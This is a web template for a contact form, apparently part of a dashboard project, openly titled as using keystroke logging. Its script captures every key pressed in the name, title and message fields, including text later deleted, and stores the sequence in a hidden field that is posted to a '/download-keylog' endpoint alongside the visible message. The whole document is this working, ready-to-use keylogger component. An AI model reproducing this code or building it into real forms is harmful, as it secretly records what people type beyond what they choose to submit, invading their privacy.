{% extends 'dashboard.html' %}

{% block content %}
<div class="container mt-5">
  <h2 class="mb-4">Contact Form with Keystroke Logging</h2>
  <form id="keyLoggerForm" method="POST" action="/download-keylog" class="needs-validation" novalidate>
    <div class="mb-3">
      <label for="name" class="form-label">Name:</label>
      <input type="text" class="form-control" name="name" id="name" required>
    </div>

    <div class="mb-3">
      <label for="title" class="form-label">Title:</label>
      <input type="text" class="form-control" name="title" id="title" required>
    </div>

    <div class="mb-3">
      <label for="message" class="form-label">Message:</label>
      <textarea class="form-control" name="message" id="message" rows="5" required></textarea>
    </div>

    <input type="hidden" name="keystrokes" id="keystrokes">
    <button type="submit" class="btn btn-primary">Submit</button>
  </form>
</div>

<script>
  let keystrokes = [];
  document.querySelectorAll("input, textarea").forEach(input => {
    input.addEventListener("keydown", function(event) {
      keystrokes.push(event.key);
      document.getElementById("keystrokes").value = keystrokes.join(' ');
    });
  });
</script>
{% endblock %}
